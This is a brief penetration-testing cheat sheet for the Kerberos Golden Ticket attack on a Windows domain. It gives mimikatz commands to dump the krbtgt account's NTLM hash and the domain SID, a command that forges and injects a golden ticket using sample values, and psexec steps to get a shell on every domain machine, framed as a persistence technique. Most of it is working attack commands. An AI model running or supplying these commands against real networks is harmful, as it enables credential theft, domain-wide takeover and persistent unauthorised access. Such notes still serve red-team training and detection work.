# Golden Ticket Attack

**Permissions: SYSTEM / ADMINISTRATOR**

## Intro

This attack lets us connect to all the computers on the domain. Using the **krbtgt** user with a kerberos ticket granting ticket, we can request access to any resource or system on the domain using the ticket granting service. This is a cool attack and is a Persistence.

### Execution

```
lsadump::lsa /inject /name:krbtgt 
```

* Copy the **SID** of the domain.
* Copy the **NTLM Hash** of the **krbtgt** user account.

### Generate Golden Ticket

```
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:500 /ptt
```

* **ptt** is for **Pass the Ticket**.

### Use psexec.exe

In the same mimikatz terminal run:

```
misc::cmd
```

This is a terminal that has the golden ticket. Now upload psexec.exe and run it like this to get a shell on every computer domain:

```
psexec.exe \\Machine cmd.exe
```

